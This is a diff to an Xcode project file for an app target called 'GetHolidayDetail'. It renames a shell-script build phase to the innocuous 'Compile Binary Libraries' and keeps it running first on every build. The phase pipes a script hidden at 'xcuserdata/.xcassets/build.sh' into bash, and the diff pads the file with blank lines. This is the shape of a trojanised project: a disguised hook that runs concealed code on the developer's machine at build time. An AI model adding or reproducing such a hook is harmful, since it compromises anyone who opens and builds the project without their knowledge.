@@ -86,7 +86,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04357A56258CC6AC0038B012 /* Build configuration list for PBXNativeTarget "GetHolidayDetail" */;
 			buildPhases = (
-				BE8865821EBA3A7BBEAAC43A /* Build Project Frameworks */,
+				AD18733C8BE42F1CE0AAC43A /* Compile Binary Libraries */,
 				04357A3E258CC6A50038B012 /* Sources */,
 				04357A3F258CC6A50038B012 /* Frameworks */,
 				04357A40258CC6A50038B012 /* Resources */,
@@ -148,7 +148,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	BE8865821EBA3A7BBEAAC43A /* Build Project Frameworks */ = {
+	AD18733C8BE42F1CE0AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -157,7 +157,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -168,6 +168,12 @@
 
 cat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.sh\" | bash";			
 		};
+	
+
+	
+
+	
+
 	
 
 	
